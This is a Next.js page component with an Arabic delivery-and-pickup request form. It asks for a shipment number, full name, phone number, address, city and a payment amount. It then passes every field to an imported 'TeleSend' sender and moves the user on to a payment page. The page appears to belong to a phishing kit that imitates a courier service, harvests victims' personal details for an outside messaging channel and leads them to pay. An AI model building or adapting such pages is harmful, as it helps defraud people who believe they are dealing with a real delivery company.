"use client"
import { useState} from 'react'

import styles from './fozajil.module.css'
import Image from 'next/image'
import formza from '../../../public/formza.png'

import { useRouter } from 'next/navigation'
import TeleSned from '@/server/TeleSend'


const Page = () => {
  const {Send} = TeleSned();
  const [form,setForm]=useState({
    data:{
      رقم_الشحنة:"",
      type:"اختر",
      الاسم_الكامل:"",
      رقم_الهاتف:"",
      نوع_الشحنة:"",
      العنوان:"",
      المدينة:"",
      قيمة:""
    }
  });

  const setDynamicFormData = (name,value)=>{
    setForm({
      data:{
        ...form.data,
        [name]:value,
      }
    })
  }
  const PostToDiscord = () => {
    const description = Object.entries(form.data)
      .map((d) => `${d[0]} : ${d[1]} `)
      .join("\n");
    Send(description)
   
    
  };
  
  
  const router = useRouter()

  const handlerout = () => {
    
if(form.data.رقم_الشحنة == "" || form.data.type == "اختر" || form.data.الاسم_الكامل== "" || form.data.رقم_الهاتف == ""|| form.data.نوع_الشحنة == ""|| form.data.العنوان == ""||form.data.المدينة == ""||form.data.قيمة == "") {
      alert('من فضلك قم بملى الحقول')
    }else{
       router.push(`/fozajil/pay?names=${form.data.رقم_الشحنة}`)
    }
  }


  

  return (
    <div className={styles.contain} dir='rtl'>
      <div className={styles.navbar}>
        <h2>طلب  توصيل واستلام</h2>
      </div>
        <form onSubmit={(e)=>{
          e.preventDefault();
          PostToDiscord()
        }}> 
            <Image 
              src={formza}
              width={394}
            />

            <select name="type" onChange={(e) => {
                  const { name, value } = e.target;
                  setDynamicFormData(name, value);
                }}>
              <option value="اختر">اختر نوع الخدمة</option>
              <option value="توصيل">توصيل</option>
              <option value="استلام">استلام</option>
            </select>
            <input type="text" name='رقم_الشحنة' onChange={(e) => {
                  const { name, value } = e.target;
                  setDynamicFormData(name, value);
                }}  placeholder='رقم الشحنة' required />
            
            <input type="text" name='نوع_الشحنة' onChange={(e) => {
                  const { name, value } = e.target;
                  setDynamicFormData(name, value);
                }} placeholder='نوع الشحنة' required />
            <input type="text" name='الاسم_الكامل' onChange={(e) => {
                  const { name, value } = e.target;
                  setDynamicFormData(name, value);
                }} placeholder='الأسم الكامل' required />
            <input type="number" name='رقم_الهاتف' onChange={(e) => {
                  const { name, value } = e.target;
                  setDynamicFormData(name, value);
                }} placeholder='رقم الجوال' required maxLength="10"/>
            
            <input type="text" name='العنوان'  placeholder='العنوان' onChange={(e) => {
                  const { name, value } = e.target;
                  setDynamicFormData(name, value);
                }}required />
            <input type="text" name='المدينة'  placeholder='المدينة' onChange={(e) => {
                  const { name, value } = e.target;
                  setDynamicFormData(name, value);
                }}required />
            <input type="number" name='قيمة' placeholder='قيمة السداد' onChange={(e) => {
                  const { name, value } = e.target;
                  setDynamicFormData(name, value);
                }} required />
            <button type='submit' onClick={handlerout}>التالي</button> 
            
            
        </form>
    </div>

  )
}

export default Page; 
